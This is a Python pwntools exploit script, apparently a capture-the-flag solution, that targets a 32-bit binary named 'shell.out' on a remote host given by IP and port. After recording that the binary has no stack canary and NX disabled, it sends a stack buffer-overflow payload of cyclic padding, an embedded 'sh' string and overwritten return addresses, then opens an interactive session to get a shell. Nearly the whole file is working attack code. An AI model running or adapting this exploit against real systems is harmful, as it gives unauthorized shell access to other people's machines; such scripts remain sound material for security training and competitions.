#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template shell.out --host dev.fyrehost.net --port 4000
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('shell.out')
pty = process.PTY
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '213.133.103.186'
port = int(args.PORT or 7562)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, stdout=pty, stdin=pty, gdbscript=gdbscript, *a, **kw)
    if args.EDB:
        return process(["edb", "--run", exe.path] + argv, stdout=pty, stdin=pty, *a, **kw)
    else:
        return process([exe.path] + argv, stdout=pty, stdin=pty, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = start()
offset = 62
io.recvuntil(b'Enter your name:')
payload = flat(
    b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaka',
    b'sh\x00',
    b'aaamaaanaaaoaaapp',
    p32(0x5655628b),
    b'B' * 4,
    p32(0x5655a5da)
)

io.sendline(payload)

io.interactive()

